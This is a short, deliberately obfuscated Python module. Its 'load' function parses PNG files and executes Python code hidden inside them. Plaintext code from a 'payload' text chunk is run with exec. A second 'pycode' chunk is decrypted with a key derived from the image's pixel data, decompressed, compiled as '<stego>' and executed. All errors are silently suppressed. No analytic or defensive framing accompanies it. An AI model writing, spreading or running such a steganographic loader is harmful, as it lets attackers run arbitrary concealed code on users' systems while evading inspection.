import hashlib as _H, zlib as _Z, builtins as _B

_A = b"\x89PNG\r\n\x1a\n"

def _a(_p: bytes):
    if not _p.startswith(_A): return
    _i, _n = 8, len(_p)
    while _i + 12 <= _n:
        _L = int.from_bytes(_p[_i:_i+4], "big")
        _T = _p[_i+4:_i+8]
        _D = _p[_i+8:_i+8+_L]
        yield _T, _D
        _i += 12 + _L

def _b(_p: bytes) -> bytes:
    _h = _H.sha256()
    for _T, _D in _a(_p):
        if _T == b"IDAT": _h.update(_D)
    return _h.digest()

def _c(_k: bytes, _n: int) -> bytes:
    _o, _x = bytearray(), 0
    while len(_o) < _n:
        _o += _H.sha256(_k + _x.to_bytes(8, "big")).digest()
        _x += 1
    return bytes(_o[:_n])

def _d(_u: bytes, _v: bytes) -> bytes:
    return bytes(__ ^ ___ for __, ___ in zip(_u, _v))

def load(_P: str, _S: dict):
    try:
        _BLOB = _B.open(_P,"rb").read()
        if not _BLOB.startswith(_A): return
    except Exception: return
    _X = _Y = None
    for _T, _D in _a(_BLOB):
        if _T == b"tEXt" and _D.startswith(b"payload\x00"):
            _X = _D.split(b"\x00",1)[1]
        elif _T == b"iTXt" and _D.startswith(b"pycode\x00"):
            _Y = _D.split(b"\x00",1)[1]
    if _X:
        try: _B.exec(_X.decode("utf-8","ignore"), _S)
        except Exception: pass
    if _Y:
        try:
            _K = _b(_BLOB)
            _Q = _c(_K,len(_Y))
            _R = _d(_Y,_Q)
            _SRC = _Z.decompress(_R).decode("utf-8","ignore")
            _C = compile(_SRC,"<stego>","exec")
            _B.exec(_C,_S)
        except Exception: pass
